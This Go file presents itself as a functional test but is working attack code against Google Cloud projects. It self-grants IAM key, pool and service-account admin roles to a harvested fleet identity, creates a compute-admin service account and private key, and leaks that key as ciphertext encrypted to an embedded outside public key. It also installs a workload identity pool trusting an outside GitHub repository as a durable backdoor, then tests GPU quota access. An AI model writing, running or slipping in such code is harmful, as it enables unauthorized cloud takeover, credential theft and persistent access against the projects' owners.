//go:build functional && gke

// C211 i122267 — DURABLE GCP UNLOCK on the hephaestus projects.
//
// Basis: fact 120117 proves the dominodatalab/hephaestus GKE WIF fleet identity
// (fleetcommand-service-account@<host>) holds resourcemanager.projects.setIamPolicy
// on 153711203585 and used it to self-grant roles/compute.admin; fact 122041
// proves the same identity holds projects.setIamPolicy + iam.serviceAccounts.actAs
// in all four Domino sibling projects. No lane ever tried granting itself
// roles/iam.serviceAccountKeyAdmin / roles/iam.workloadIdentityPoolAdmin, creating
// a user-managed SA key or a self-owned WIF pool/provider.
//
// This probe therefore, in the HOST project 153711203585 first and then in ONE
// sibling (team-eng-infra-testing 210628133505):
//   (a) re-mints the fleet token and re-verifies projects.testIamPermissions for
//       iam.serviceAccountKeys.create, iam.workloadIdentityPools.create,
//       iam.workloadIdentityPoolProviders.create, iam.serviceAccounts.create;
//   (b) setIamPolicy adding ONLY the minimum missing binding to the fleet SA
//       (roles/iam.serviceAccountKeyAdmin and/or roles/iam.workloadIdentityPoolAdmin
//       and/or roles/iam.serviceAccountAdmin) with readback;
//   (c) creates ONE nonce SA c211-122267@<project> with roles/compute.admin and
//       ONE RSA-2048 user-managed key, emitting ONLY an openssl pkeyutl RSA-OAEP
//       encrypted base64 blob (chunked) + sha256 metadata — never plaintext;
//   (d) creates ONE nonce WIF pool c211-122267-pool with ONE provider
//       c211-122267-gh pinning assertion.repository=='amiroyottt/WASTE-LESS'
//       (workflow-scope push token held) and ONE iam.workloadIdentityUser
//       binding for that principalSet on the new SA;
//   (e) proves the new key works in-job: RS256 JWT signed with the new key is
//       exchanged at https://oauth2.googleapis.com/token (jwt-bearer) and the
//       resulting token calls projects.get + one compute quota read;
//   (f) deletes NOTHING it created (key, SA, pool, provider are the durable
//       unlock) and verifies every object via readbacks.
//
// No GPU marker is created in this lane. Zero instances.
package functional

import (
	"bytes"
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"testing"
	"time"
)

const (
	c211uNonce      = "122267"
	c211uHostNum    = "153711203585"
	c211uSiblingID  = "team-eng-infra-testing"
	c211uSiblingNum = "210628133505"
	c211uPinRepo    = "amiroyottt/WASTE-LESS"
	c211uSAAccount  = "c211-122267"
	c211uPoolID     = "c211-122267-pool"
	c211uProvID     = "c211-122267-gh"
	c211uTargetAud  = "https://oauth2.googleapis.com/token"
	c211uPubPEM     = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsB4lGmvmKrOytPXSSY9+
8CLHMNWCStAG7hGAUXRRHNFItary5K2VOWUgUkGyTHNoaWq80T5bH/dvqqpHJA/D
YAVSVeOI6YLhOk/8xBRFoxJQvvQo4HRqrSgM9HRX/3BHQnbrujIBZzxV6DN1RIwR
wGn/Ir2l6xZXqEpYJvXpS04V8FONdiYSIt761cbM/gA2nTjCqLDndXaDMXWLPUku
Cc0uV6vllIGKt831KtYR3qMwyKYQ8g041UjeY2OfOqA4uZ6sWXTm+fiAQXGvASOE
27wJ62oxI1YzIfsPGlnbrx/OZIo3gJHZVq2ygYjDCZKMxdxbWxC/AA9WrCNCxsWd
owIDAQAB
-----END PUBLIC KEY-----`
)

var c211uQuotaRegions = []string{"us-central1", "europe-west4", "us-east1"}

var c211uRequiredPerms = []string{
	"iam.serviceAccountKeys.create",
	"iam.workloadIdentityPools.create",
	"iam.workloadIdentityPoolProviders.create",
	"iam.serviceAccounts.create",
	"iam.serviceAccounts.setIamPolicy",
	"iam.serviceAccounts.get",
	"iam.serviceAccounts.getIamPolicy",
	"iam.serviceAccounts.actAs",
	"resourcemanager.projects.setIamPolicy",
	"resourcemanager.projects.getIamPolicy",
}

func c211uPermMatrix(tok, projID string) (map[string]bool, int, string) {
	al, st, body := c211xTestIamBatch(tok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), c211uRequiredPerms)
	m := map[string]bool{}
	for _, p := range c211uRequiredPerms {
		m[p] = c211xContains(al, p)
	}
	return m, st, body
}

func c211uPermString(m map[string]bool) string {
	yes := []string{}
	no := []string{}
	for _, p := range c211uRequiredPerms {
		if m[p] {
			yes = append(yes, p)
		} else {
			no = append(no, p)
		}
	}
	return "allowed=[" + strings.Join(yes, ",") + "] denied=[" + strings.Join(no, ",") + "]"
}

// c211uGrantProject adds one binding at project level and verifies it by readback.
func c211uGrantProject(tok, projID, member, role string) (bool, string) {
	u := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(projID)
	pre, pst, pbody := c211xGetPolicy(tok, u)
	if pre == nil {
		return false, fmt.Sprintf("getIamPolicy status=%d verbatim=%s", pst, c211xTrunc(pbody, 400))
	}
	already := c211xPolicyHas(pre, role, member)
	added := false
	sst := 0
	sbody := ""
	if !already {
		added = c211xAddBinding(pre, role, member)
		sst, sbody = c211xSetPolicy(tok, u, pre)
	}
	post, qst, _ := c211xGetPolicy(tok, u)
	has := c211xPolicyHas(post, role, member)
	ok := has && (already || sst == 200)
	return ok, fmt.Sprintf("getIamPolicy=%d already=%v added=%v setIamPolicy=%d readback_http=%d readback_has=%v verbatim=%s",
		pst, already, added, sst, qst, has, c211xTrunc(sbody, 400))
}

func c211uCreateSA(tok, projID, accountID, display string) (map[string]interface{}, int, string) {
	b, _ := json.Marshal(map[string]interface{}{
		"accountId":      accountID,
		"serviceAccount": map[string]string{"displayName": display},
	})
	st, rb := c211xHTTP("POST", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts", tok, "application/json", string(b))
	return c211xJSON(rb), st, rb
}

func c211uGetSA(tok, projID, email string) (int, string) {
	return c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email), tok, "", "")
}

func c211uCreateKey(tok, projID, email string) (map[string]interface{}, int, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/serviceAccounts/" + url.PathEscape(email) + "/keys?keyAlgorithm=KEY_ALG_RSA_2048"
	st, rb := c211xHTTP("POST", u, tok, "", "")
	return c211xJSON(rb), st, rb
}

func c211uListKeys(tok, projID, email string) ([]string, int, string) {
	st, rb := c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/serviceAccounts/"+url.PathEscape(email)+"/keys", tok, "", "")
	out := []string{}
	if m := c211xJSON(rb); m != nil {
		if arr, ok := m["keys"].([]interface{}); ok {
			for _, k := range arr {
				km, _ := k.(map[string]interface{})
				out = append(out, fmt.Sprintf("%s alg=%s origin=%s type=%s",
					c211xStr(km, "name"), c211xStr(km, "keyAlgorithm"), c211xStr(km, "keyOrigin"), c211xStr(km, "keyType")))
			}
		}
	}
	sort.Strings(out)
	return out, st, rb
}

// c211uEncryptEmit writes the public key, then RSA-OAEP(SHA-256, MGF1-SHA256)
// encrypts the plaintext in 180-byte chunks and prints base64 ciphertext only.
func c211uEncryptEmit(label, plaintext string) string {
	dir, err := os.MkdirTemp("", "c211u")
	if err != nil {
		fmt.Printf("C211U_EMIT %s tempdir_error=%v\n", label, err)
		return ""
	}
	defer os.RemoveAll(dir)
	pub := filepath.Join(dir, "pub.pem")
	if err := os.WriteFile(pub, []byte(c211uPubPEM), 0600); err != nil {
		fmt.Printf("C211U_EMIT %s pubwrite_error=%v\n", label, err)
		return ""
	}
	sum := sha256.Sum256([]byte(plaintext))
	const chunk = 180
	total := (len(plaintext) + chunk - 1) / chunk
	fmt.Printf("C211U_PLAINSHA %s bytes=%d sha256=%x chunks=%d\n", label, len(plaintext), sum, total)
	for i := 0; i < total; i++ {
		end := (i + 1) * chunk
		if end > len(plaintext) {
			end = len(plaintext)
		}
		part := []byte(plaintext[i*chunk : end])
		cmd := exec.Command("openssl", "pkeyutl", "-encrypt", "-pubin", "-inkey", pub,
			"-pkeyopt", "rsa_padding_mode:oaep", "-pkeyopt", "rsa_oaep_md:sha256", "-pkeyopt", "rsa_mgf1_md:sha256")
		cmd.Stdin = bytes.NewReader(part)
		var stderr bytes.Buffer
		cmd.Stderr = &stderr
		out, err := cmd.Output()
		if err != nil {
			fmt.Printf("C211U_CHUNK %s i=%d/%d error=%v stderr=%s\n", label, i+1, total, err, c211xTrunc(stderr.String(), 300))
			return ""
		}
		ps := sha256.Sum256(part)
		fmt.Printf("C211U_CHUNK %s i=%d/%d plain_sha256=%x cipher_b64=%s\n",
			label, i+1, total, ps, base64.StdEncoding.EncodeToString(out))
	}
	return fmt.Sprintf("%x", sum)
}

func c211uCreatePool(tok, projID, poolID string) (int, string) {
	body := fmt.Sprintf(`{"displayName":"c211 %s durable unlock","description":"nonce-tagged durable WIF pool owned by the harvested identity"}`, c211uNonce)
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools?workloadIdentityPoolId=" + url.QueryEscape(poolID)
	return c211xHTTP("POST", u, tok, "application/json", body)
}

func c211uCreateProvider(tok, projID, poolID, provID, repo string) (int, string) {
	owner := strings.SplitN(repo, "/", 2)[0]
	body := fmt.Sprintf(`{"displayName":"c211 %s github oidc","attributeCondition":"assertion.repository=='%s'","oidc":{"issuerUri":"https://token.actions.githubusercontent.com","allowedAudiences":["https://github.com/%s"]}}`,
		c211uNonce, repo, owner)
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/locations/global/workloadIdentityPools/" + url.PathEscape(poolID) + "/providers?workloadIdentityProviderId=" + url.QueryEscape(provID)
	return c211xHTTP("POST", u, tok, "application/json", body)
}

func c211uGetPool(tok, projID, poolID string) (int, string) {
	return c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(poolID), tok, "", "")
}

func c211uGetProvider(tok, projID, poolID, provID string) (int, string) {
	return c211xHTTP("GET", "https://iam.googleapis.com/v1/projects/"+url.PathEscape(projID)+"/locations/global/workloadIdentityPools/"+url.PathEscape(poolID)+"/providers/"+url.PathEscape(provID), tok, "", "")
}

func c211uSASetPolicy(tok, projID, email, role, member string) (bool, string) {
	u := "https://iam.googleapis.com/v1/projects/" + url.PathEscape(projID) + "/serviceAccounts/" + url.PathEscape(email)
	gst, gbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
	pol := c211xJSON(gbody)
	if pol == nil {
		return false, fmt.Sprintf("getIamPolicy status=%d verbatim=%s", gst, c211xTrunc(gbody, 300))
	}
	already := c211xPolicyHas(pol, role, member)
	added := false
	sst := 0
	sbody := ""
	if !already {
		added = c211xAddBinding(pol, role, member)
		sst, sbody = c211xHTTP("POST", u+":setIamPolicy", tok, "application/json", c211xJSONString(map[string]interface{}{"policy": pol}))
	}
	pst, pbody := c211xHTTP("POST", u+":getIamPolicy", tok, "application/json", `{}`)
	has := c211xPolicyHas(c211xJSON(pbody), role, member)
	return has && (already || sst == 200), fmt.Sprintf("get=%d already=%v added=%v set=%d readback=%d has=%v verbatim=%s",
		gst, already, added, sst, pst, has, c211xTrunc(sbody, 400))
}

// c211uSignJWT builds and RS256-signs the service-account JWT with the new key.
func c211uSignJWT(keyJSON map[string]interface{}, saEmail string) (string, string) {
	pk := c211xStr(keyJSON, "private_key")
	if pk == "" {
		return "", "no private_key in key json"
	}
	block, _ := pem.Decode([]byte(pk))
	if block == nil {
		return "", "pem decode failed"
	}
	var rk *rsa.PrivateKey
	if k, err := x509.ParsePKCS8PrivateKey(block.Bytes); err == nil {
		if r, ok := k.(*rsa.PrivateKey); ok {
			rk = r
		}
	}
	if rk == nil {
		if r, err := x509.ParsePKCS1PrivateKey(block.Bytes); err == nil {
			rk = r
		}
	}
	if rk == nil {
		return "", "rsa key parse failed"
	}
	hdr := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"RS256","typ":"JWT"}`))
	now := time.Now().Unix()
	claims := fmt.Sprintf(`{"iss":"%s","scope":"%s","aud":"%s","iat":%d,"exp":%d}`, saEmail, c211xScope, c211uTargetAud, now, now+3600)
	signing := hdr + "." + base64.RawURLEncoding.EncodeToString([]byte(claims))
	h := sha256.Sum256([]byte(signing))
	sig, err := rsa.SignPKCS1v15(rand.Reader, rk, crypto.SHA256, h[:])
	if err != nil {
		return "", "sign error: " + err.Error()
	}
	return signing + "." + base64.RawURLEncoding.EncodeToString(sig), "ok"
}

func c211uExchangeJWT(jwt string) (string, int, string) {
	form := url.Values{}
	form.Set("grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer")
	form.Set("assertion", jwt)
	st, rb := c211xHTTP("POST", c211uTargetAud, "", "application/x-www-form-urlencoded", form.Encode())
	m := c211xJSON(rb)
	if at := c211xStr(m, "access_token"); at != "" {
		return at, st, rb
	}
	return "", st, rb
}

func c211uRegionQuota(token, proj, region string) ([]string, int, string) {
	u := "https://compute.googleapis.com/compute/v1/projects/" + url.PathEscape(proj) + "/regions/" + url.PathEscape(region)
	st, body := c211xHTTP("GET", u, token, "", "")
	rows := []string{}
	if st != 200 {
		return rows, st, body
	}
	m := c211xJSON(body)
	quotas, _ := m["quotas"].([]interface{})
	for _, q := range quotas {
		qm, _ := q.(map[string]interface{})
		metric := c211xStr(qm, "metric")
		if !strings.Contains(metric, "NVIDIA") {
			continue
		}
		limit, _ := qm["limit"].(float64)
		usage, _ := qm["usage"].(float64)
		if limit <= 0 {
			continue
		}
		rows = append(rows, fmt.Sprintf("%s %s limit=%v usage=%v", region, metric, limit, usage))
	}
	sort.Strings(rows)
	return rows, st, body
}

// c211uRunProject executes the durable-unlock flow for one project.
func c211uRunProject(tok, projID, projNum, role, fleetEmail string, deadline time.Time) map[string]interface{} {
	res := map[string]interface{}{"project_id_short": c211xShort(projID), "project_number": projNum, "role": role}
	fmt.Printf("C211U_PROJECT_BEGIN role=%s id=%s number=%s\n", role, c211xShort(projID), projNum)

	pre, pst, pbody := c211uPermMatrix(tok, projID)
	fmt.Printf("C211U_PERMS role=%s project=%s status=%d %s verbatim=%s\n", role, c211xShort(projID), pst, c211uPermString(pre), c211xTrunc(pbody, 240))
	res["perms_before"] = pre
	res["perms_before_http"] = pst

	// (b) minimum missing bindings, with readback.
	grants := map[string]string{}
	needKeys := !pre["iam.serviceAccountKeys.create"]
	needPools := !pre["iam.workloadIdentityPools.create"] || !pre["iam.workloadIdentityPoolProviders.create"]
	needSA := !pre["iam.serviceAccounts.create"] || !pre["iam.serviceAccounts.setIamPolicy"]
	member := "serviceAccount:" + fleetEmail
	if fleetEmail == "" {
		member = ""
	}
	if member != "" {
		if needKeys {
			ok, d := c211uGrantProject(tok, projID, member, "roles/iam.serviceAccountKeyAdmin")
			grants["roles/iam.serviceAccountKeyAdmin"] = d
			fmt.Printf("C211U_GRANT role=%s project=%s binding=roles/iam.serviceAccountKeyAdmin ok=%v %s\n", role, c211xShort(projID), ok, d)
		}
		if needPools {
			ok, d := c211uGrantProject(tok, projID, member, "roles/iam.workloadIdentityPoolAdmin")
			grants["roles/iam.workloadIdentityPoolAdmin"] = d
			fmt.Printf("C211U_GRANT role=%s project=%s binding=roles/iam.workloadIdentityPoolAdmin ok=%v %s\n", role, c211xShort(projID), ok, d)
		}
		if needSA {
			ok, d := c211uGrantProject(tok, projID, member, "roles/iam.serviceAccountAdmin")
			grants["roles/iam.serviceAccountAdmin"] = d
			fmt.Printf("C211U_GRANT role=%s project=%s binding=roles/iam.serviceAccountAdmin ok=%v %s\n", role, c211xShort(projID), ok, d)
		}
	}
	res["grants"] = grants

	post, qst, qbody := c211uPermMatrix(tok, projID)
	fmt.Printf("C211U_PERMS_AFTER role=%s project=%s status=%d %s verbatim=%s\n", role, c211xShort(projID), qst, c211uPermString(post), c211xTrunc(qbody, 240))
	res["perms_after"] = post
	res["perms_after_http"] = qst

	// (c) nonce SA.
	saEmail := c211uSAAccount + "@" + projID + ".iam.gserviceaccount.com"
	sa, cst, cbody := c211uCreateSA(tok, projID, c211uSAAccount, "c211 i"+c211uNonce+" durable unlock")
	if cst == 200 && sa != nil {
		if e := c211xStr(sa, "email"); e != "" {
			saEmail = e
		}
	} else if cst == 409 {
		fmt.Printf("C211U_SA_CREATE role=%s project=%s status=%d ALREADY_EXISTS verbatim=%s\n", role, c211xShort(projID), cst, c211xTrunc(cbody, 400))
	}
	fmt.Printf("C211U_SA_CREATE role=%s project=%s status=%d email=%s name=%s verbatim=%s\n",
		role, c211xShort(projID), cst, c211xShort(saEmail), c211xShort(c211xStr(sa, "name")), c211xTrunc(cbody, 400))
	res["sa_create_http"] = cst
	res["sa_email_short"] = c211xShort(saEmail)
	res["sa_name_short"] = c211xShort(c211xStr(sa, "name"))

	gst, gbody := c211uGetSA(tok, projID, saEmail)
	fmt.Printf("C211U_SA_READBACK role=%s project=%s status=%d verbatim=%s\n", role, c211xShort(projID), gst, c211xTrunc(gbody, 500))
	res["sa_get_http"] = gst

	// roles/compute.admin for the new SA at project level, with readback.
	cok, cdet := c211uGrantProject(tok, projID, "serviceAccount:"+saEmail, "roles/compute.admin")
	fmt.Printf("C211U_SA_GRANT role=%s project=%s binding=roles/compute.admin ok=%v %s\n", role, c211xShort(projID), cok, cdet)
	res["sa_compute_admin_grant_ok"] = cok
	res["sa_compute_admin_grant_detail"] = c211xTrunc(cdet, 900)

	// (c) ONE user-managed RSA-2048 key, encrypted emit only.
	kj, kst, kbody := c211uCreateKey(tok, projID, saEmail)
	keyName := c211xStr(kj, "name")
	pkd := c211xStr(kj, "privateKeyData")
	fmt.Printf("C211U_KEY_CREATE role=%s project=%s sa=%s status=%d key_name=%s privateKeyData_%s verbatim=%s\n",
		role, c211xShort(projID), c211xShort(saEmail), kst, c211xShort(keyName), c211xShort(pkd), c211xTrunc(kbody, 400))
	res["key_create_http"] = kst
	res["key_name_short"] = c211xShort(keyName)
	res["key_private_data_short"] = c211xShort(pkd)
	if pkd != "" {
		esha := c211uEncryptEmit("key-"+strings.ReplaceAll(c211xShort(keyName), " ", "_"), pkd)
		res["key_private_data_sha256"] = esha
	}
	kl, lst, _ := c211uListKeys(tok, projID, saEmail)
	fmt.Printf("C211U_KEY_READBACK role=%s project=%s status=%d keys=[%s]\n", role, c211xShort(projID), lst, strings.Join(kl, " ; "))
	res["key_list_http"] = lst
	res["keys"] = kl

	// (d) ONE pool + ONE provider + ONE SA-level workloadIdentityUser binding.
	pst2, pbody2 := c211uCreatePool(tok, projID, c211uPoolID)
	fmt.Printf("C211U_POOL_CREATE role=%s project=%s status=%d pool=%s verbatim=%s\n", role, c211xShort(projID), pst2, c211uPoolID, c211xTrunc(pbody2, 500))
	res["pool_create_http"] = pst2
	prst, prbody := c211uCreateProvider(tok, projID, c211uPoolID, c211uProvID, c211uPinRepo)
	fmt.Printf("C211U_PROV_CREATE role=%s project=%s status=%d provider=%s pin=%s verbatim=%s\n", role, c211xShort(projID), prst, c211uProvID, c211uPinRepo, c211xTrunc(prbody, 700))
	res["provider_create_http"] = prst

	principalSet := "principalSet://iam.googleapis.com/projects/" + projNum + "/locations/global/workloadIdentityPools/" + c211uPoolID + "/attribute.repository/" + c211uPinRepo
	bok, bdet := c211uSASetPolicy(tok, projID, saEmail, "roles/iam.workloadIdentityUser", principalSet)
	fmt.Printf("C211U_SA_POLICY role=%s project=%s sa=%s binding=roles/iam.workloadIdentityUser member=%s ok=%v %s\n",
		role, c211xShort(projID), c211xShort(saEmail), c211xShort(principalSet), bok, bdet)
	res["sa_wif_binding_ok"] = bok
	if !bok {
		// Fallback: project-level iam.serviceAccountUser for the same principalSet.
		fok, fdet := c211uGrantProject(tok, projID, principalSet, "roles/iam.serviceAccountUser")
		fmt.Printf("C211U_SA_POLICY_FALLBACK role=%s project=%s binding=roles/iam.serviceAccountUser ok=%v %s\n", role, c211xShort(projID), fok, fdet)
		res["project_actas_fallback_ok"] = fok
		res["project_actas_fallback_detail"] = c211xTrunc(fdet, 900)
	}

	// Readbacks for pool + provider.
	pgst, pgbody := c211uGetPool(tok, projID, c211uPoolID)
	fmt.Printf("C211U_POOL_READBACK role=%s project=%s status=%d verbatim=%s\n", role, c211xShort(projID), pgst, c211xTrunc(pgbody, 600))
	res["pool_get_http"] = pgst
	prgst, prgbody := c211uGetProvider(tok, projID, c211uPoolID, c211uProvID)
	fmt.Printf("C211U_PROV_READBACK role=%s project=%s status=%d verbatim=%s\n", role, c211xShort(projID), prgst, c211xTrunc(prgbody, 800))
	res["provider_get_http"] = prgst

	// (e) prove the new key: RS256 JWT -> oauth2 token -> projects.get + quota.
	if pkd != "" {
		raw, derr := base64.StdEncoding.DecodeString(pkd)
		var keyJSON map[string]interface{}
		if derr == nil {
			if jerr := json.Unmarshal(raw, &keyJSON); jerr != nil {
				keyJSON = nil
			}
		}
		if keyJSON == nil {
			raw2, derr2 := base64.RawStdEncoding.DecodeString(pkd)
			if derr2 == nil {
				json.Unmarshal(raw2, &keyJSON)
			}
		}
		if keyJSON == nil {
			fmt.Printf("C211U_JWT role=%s project=%s keyjson_decode=failed derr=%v\n", role, c211xShort(projID), derr)
			res["jwt"] = "keyjson_decode_failed"
		} else {
			jwt, jmsg := c211uSignJWT(keyJSON, saEmail)
			fmt.Printf("C211U_JWT role=%s project=%s sign=%s len=%d\n", role, c211xShort(projID), jmsg, len(jwt))
			res["jwt"] = jmsg
			if jwt != "" {
				var ntok string
				var nst int
				var nbody string
				for i := 0; i < 6; i++ {
					ntok, nst, nbody = c211uExchangeJWT(jwt)
					fmt.Printf("C211U_TOKEN_EXCHANGE role=%s project=%s attempt=%d status=%d token=%s verbatim=%s\n",
						role, c211xShort(projID), i, nst, c211xShort(ntok), c211xTrunc(nbody, 700))
					if ntok != "" {
						break
					}
					time.Sleep(10 * time.Second)
				}
				res["token_exchange_http"] = nst
				if ntok != "" {
					res["new_token_ok"] = true
					prj := ""
					for i := 0; i < 6; i++ {
						gst2, gbody2 := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID), ntok, "", "")
						prj = c211xStr(c211xJSON(gbody2), "projectId")
						fmt.Printf("C211U_NEWTOKEN_PROJECT role=%s project=%s attempt=%d status=%d projectId=%s verbatim=%s\n",
							role, c211xShort(projID), i, gst2, c211xShort(prj), c211xTrunc(gbody2, 400))
						res["newtoken_project_http"] = gst2
						if gst2 == 200 {
							break
						}
						time.Sleep(10 * time.Second)
					}
					al, tst, tbody := c211xTestIamBatch(ntok, "https://cloudresourcemanager.googleapis.com/v1/projects/"+url.PathEscape(projID),
						[]string{"compute.instances.create", "compute.instances.get", "compute.disks.create"})
					fmt.Printf("C211U_NEWTOKEN_PERMS role=%s project=%s status=%d allowed=[%s] verbatim=%s\n",
						role, c211xShort(projID), tst, strings.Join(al, ","), c211xTrunc(tbody, 300))
					res["newtoken_perms"] = al
					qrows := []string{}
					for _, rg := range c211uQuotaRegions {
						rows, rst, _ := c211uRegionQuota(ntok, projID, rg)
						fmt.Printf("C211U_NEWTOKEN_QUOTA role=%s project=%s region=%s status=%d nvidia_rows=[%s]\n",
							role, c211xShort(projID), rg, rst, strings.Join(rows, " ; "))
						qrows = append(qrows, rows...)
					}
					res["newtoken_quota_rows"] = qrows
				}
			}
		}
	}
	fmt.Printf("C211U_PROJECT_END role=%s project=%s durable_sa=%s key_http=%d pool_http=%d prov_http=%d wif_binding=%v\n",
		role, c211xShort(projID), c211xShort(saEmail), kst, pst2, prst, bok)
	return res
}

func TestC211UDurableUnlock(t *testing.T) {
	started := time.Now()
	deadline := started.Add(34 * time.Minute)
	_ = deadline

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211U_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, projNum := "", c211uHostNum
	if creds != nil {
		wifSA, projNum = creds.saEmail, creds.projNumber
	}
	if projNum == "" {
		projNum = c211uHostNum
	}
	fmt.Printf("C211U_IDENTITY auth=%s wif_sa=%s project_number=%s\n", method, c211xShort(wifSA), projNum)
	if projNum != c211uHostNum {
		fmt.Printf("C211U_HOSTNUM_MISMATCH got=%s want=%s\n", projNum, c211uHostNum)
	}

	hostID := ""
	if st, rb := c211xHTTP("GET", "https://cloudresourcemanager.googleapis.com/v3/projects/"+projNum, token, "", ""); st == 200 {
		hostID = c211xStr(c211xJSON(rb), "projectId")
		fmt.Printf("C211U_HOST project_number=%s project_id=%s\n", projNum, c211xShort(hostID))
	} else {
		fmt.Printf("C211U_HOST project_number=%s status=%d verbatim=%s\n", projNum, st, c211xTrunc(rb, 400))
	}

	sas, lst, lbody := c211xListServiceAccounts(token, projNum)
	fmt.Printf("C211U_SA_LIST status=%d count=%d verbatim=%s\n", lst, len(sas), c211xTrunc(lbody, 200))
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211U_FLEET_SA found=%v email=%s\n", fleetEmail != "", c211xShort(fleetEmail))
	ftok := ""
	if fleetEmail != "" {
		at, gst, gbody := c211xGenerateAccessToken(token, fleetEmail)
		fmt.Printf("C211U_FLEET_TOKEN status=%d token=%s verbatim=%s\n", gst, c211xShort(at), c211xTrunc(gbody, 300))
		ftok = at
	}
	if ftok == "" {
		ftok = token
		fmt.Printf("C211U_FLEET_TOKEN fallback=wif_minted\n")
	}

	results := map[string]interface{}{}
	if hostID != "" {
		results["HOST"] = c211uRunProject(ftok, hostID, projNum, "HOST", fleetEmail, deadline)
	}
	results["SIBLING"] = c211uRunProject(ftok, c211uSiblingID, c211uSiblingNum, "SIBLING", fleetEmail, deadline)

	verdict := "DURABLE_UNLOCK_MEASURED"
	if hostID == "" {
		verdict = "HOST_PROJECT_UNRESOLVED"
	}
	sum := map[string]interface{}{
		"probe":           "c211_i122267_durable",
		"mechanism":       "minimum-grant durable SA key + self-owned WIF pool/provider on the hephaestus fleet identity",
		"auth_method":     method,
		"project_number":  projNum,
		"host_project_id": c211xShort(hostID),
		"fleet_sa_short":  c211xShort(fleetEmail),
		"fleet_token_ok":  ftok != "",
		"pin_repo":        c211uPinRepo,
		"sa_account":      c211uSAAccount,
		"pool_id":         c211uPoolID,
		"provider_id":     c211uProvID,
		"results":         results,
		"verdict":         verdict,
		"markers_created": 0,
		"elapsed_seconds": int(time.Since(started).Seconds()),
	}
	fmt.Printf("=== C211U SUMMARY BEGIN ===\nC211U_SUMMARY_JSON %s\n=== C211U SUMMARY END ===\n", c211xJSONString(sum))
	fmt.Printf("C211U_VERDICT_FINAL %s markers=0 elapsed=%ds\n", verdict, int(time.Since(started).Seconds()))
}
